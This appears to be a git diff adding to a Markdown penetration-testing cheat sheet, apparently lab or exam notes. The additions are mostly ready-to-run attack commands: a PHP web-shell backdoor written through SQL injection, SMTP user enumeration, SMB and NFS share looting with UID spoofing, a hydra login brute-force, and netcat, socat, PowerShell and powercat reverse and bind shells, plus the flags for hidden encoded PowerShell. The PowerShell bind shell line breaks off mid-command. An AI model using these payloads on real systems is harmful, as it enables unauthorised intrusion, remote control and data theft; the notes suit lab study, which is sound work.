@@ -27,6 +27,11 @@ When receiving the error “/usr/bin/env: ‘python\r’: No such file or direct
 2.	Use the command “:set ff=unix”
 3.	Save the file. “:wq”
 
+### Powershell flags
+- -nop: (-noprofile) which instructs powershell not to load the powershell user profile.
+-	-w hidden: to avoid creating a window on the user’s desktop
+-	-e: (-EncodedCommand) use base64 encoding
+
 #### EXAMPLE COMMANDO
 ```
 <COMMANDO>
@@ -262,7 +267,7 @@ sudo netdisover -i <INTERFACE>
 Nmap is used for port scanning.
 #### Full TCP port scan
 ```
-nmap <TARGET> -sV -sC -p- -vv -oA full_tcp_-<TARGET> 
+nmap <TARGET> -sV -sC -O -p- -vv -oA full_tcp_-<TARGET> 
 ```
 
 #### Full UDP port scan
@@ -270,16 +275,33 @@ nmap <TARGET> -sV -sC -p- -vv -oA full_tcp_-<TARGET>
 nmap <TARGET> -sU -sV -sC -p- -vv -oA full_udp_-<TARGET> 
 ```
 
+#### Nmap scan most common ports wiht no host discovery
+```
+nmap <TARGET> -p 20,21,22,25,80,443,111,135,139,443,8080 -oA portsweep-<TARGET> 
+nmap <TARGET> --top-ports 25 -oA portsweep_top25-<TARGET> 
+```
+
+#### Nmap scan all vulnerabilities
+```
+nmap <TARGET> -p- --script vuln -vv -oA vulnscan_-<TARGET> 
+```
+
 #### Usefull flags
 ```
 -Pn No ping #use if host says down but you know its up)
 -sn No port scan #use if you just want to scan a range to check if hosts are up.
 ```
+
 ### Enumeration Tips
 #### HTTP Openproxy
 If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.
 
 ## Web-applications
+- Check the file extensions in URL’s to see what the application is running (.net .aspx .php etc)
+- Inspect page content
+- Check Firefox debugger for outdated javascript libraries
+- Look for /robots.txt and /sitemap.xml
+
 ### Tool Nikto
 Nikto is used for vulnerability scanning a web application.
 ```
@@ -289,6 +311,7 @@ nikto -host <URL> -output nikto-URL.txt
 ### Tools Directory fuzzing
 Directory fuzzing is used to fuzz directories on a website.
 #### Tool Dirb
+Use the -R to disable recursive scanning
 ```
 dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
 ```
@@ -297,6 +320,32 @@ dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
 ```
 -p set op a proxy <IP:PORT>
 -X Append each word with this extensions.
+```
+
+### SMTP
+#### Enumerate emails accounts
+```
+nc -nv <IP> 25
+VRFY root
+VRFY idontexist
+Check output
+```
+
+### Shares SMB
+#### Nmap enumerate SMB shares
+```
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
+```
+
+#### Download smb files recursively
+```
+smbget -R smb://<IP>/<SHARE>
+```
+
+### Shares RPC
+#### Nmap enumerate RPC shares
+```
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
 ```
 
 ### General
@@ -308,6 +357,14 @@ curl -v -X OPTIONS http://website/directory
 ```
 
 # Exploitation
+## SQL Injection
+- Use ‘ and “ to look for possible errors
+- use # and -- for comments after the injection.
+- If returning multiple rows gives errors use ```LIMIT 1``` in the query
+- use ```ORDER BY``` to find the amount of columns. Increment it by 1 till no output is shown.
+- use ```load_file('C:/Windows/System32/drivers/etc/hosts')``` to load files instead of database data.
+- use ```"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '<PATH TO WEBROOT>/backdoor.php'``` to create a simple php backdoor.
+
 ## FTP
 - Check if login is allowed as anonymous:anonymous.
 
@@ -334,18 +391,42 @@ hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<COOK
 #EXAMPLE hydra -l admin -P /opt/SecLists/Passwords/xato-net-10-million-passwords-100.txt 10.10.175.0 http-post-form '/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=u8hdjDohYmqfI8o0z7Cev4b1u0jLmv9dNA9NS95wDsZeMYw6zBFeyhiLx1QuOsZ%2FXV%2Fo%2BrCdXSC4Y7%2FueaRnmboaQQ9KZQWLME84zysowmYTAW8Kea1%2Bp7phoEwMiICbLwPPteDEYl7z6nobm8x1Mb2hMDiTpDJhracgmTh%2BJwP1Rqqt&__EVENTVALIDATION=QJmkftZnDEcQIPsstxYKnQBDsulZLsB0kmrbMa4BPzAc%2FMEDChrOmztni5OWBx83r2xGNndCAgw6wJ%2F%2FoAzYtZEcyRWC%2FaPyUR5iWSO0V8%2FIodobow1OxiuoD9uZVnVO8tcQZr3NWYjFcOVxYg5WAWvPyezvfcBk2oxUdZwsutPATiKB&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed'
 ```
 
-# Post Exploitation
-## Local privilege escalation
-### Windows
+## SMB and NETBIOS
+NetBIOS is an independent session layer protocol and service that allows computers on a local network to communicate with each other. While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT)211 is required for backward compatibility and is often enabled together.
 
-### Linux
-#### Run SUID BIT
-Use the following instead of just sudo <PROGRAM>
+#### NBTSCAN
 ```
-sudo -u root <PATH TO PROGRAM>
+sudo nbtscan -r <IP RANGE>
 ```
 
-## Listeners
+#### Nmap SMB Script
+```
+/usr/share/nmap/scripts/smb*
+```
+
+## NFS Shares
+Portmapper and RPCBind run on TCP port 111
+
+#### Enumerations
+```
+rpcinfo irked.htb
+nmap -sSUC -p111 <IP>
+```
+
+#### Mount shares
+```
+sudo mount -o nolock <IP>:/<SHARE> <MOUNT LOCATION>
+```
+
+#### Open file with no permission to file
+If a file found which we want to access but don’t have permissions. Make a user with the same username and change the UUID, change to the user so we can access the file.
+```
+sudo adduser pwn
+sudo vim /etc/passwd
+```
+
+## Shells
+### Listeners
 #### Netcat listener
 ```
 sudo nc -nlvp <PORT>
@@ -370,12 +451,64 @@ run
 powercat -l -v -p 10000
 ```
 
+### Reverse shells
+#### Netcat
+```
+nc -nv <IP> <PORT> -e /bin/bash
+```
+
+#### Socat
+```
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+```
+
+#### Powershell
+```
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+#### Powercat
+```
+powercat -c <IP> -p <PORT> -e cmd.exe
+```
+
+### Bind shells
+#### Netcat
+```
+nc -nlvp <PORT>
+```
+
+#### Powershell
+```
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('<IP>',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
+```
+
+#### Powercat
+```
+powercat -l -p <PORT> -e cmd.exe
+```
+
+# Post Exploitation
+## Local privilege escalation
+### Windows
+
+### Linux
+#### Run SUID BIT
+Use the following instead of just sudo <PROGRAM>
+```
+sudo -u root <PATH TO PROGRAM>
+```
+
 ## File transfers
 ### Download files
 #### Start webservers
 ```
 sudo service apache2 start #files in /var/www/html
-sudo python3 -m http.server <PORT> #files in current directory
+sudo python3 -m http.server <PORT> #files in current 
+sudo python2 -m SimpleHTTPServer <PORT>
+sudo php -S 0.0.0.0:<PORT>
+sudo ruby -run -e httpd . -p <PORT>
+sudo busybox httpd -f -p <PORT>
 ```
 
 #### Download file from webserver
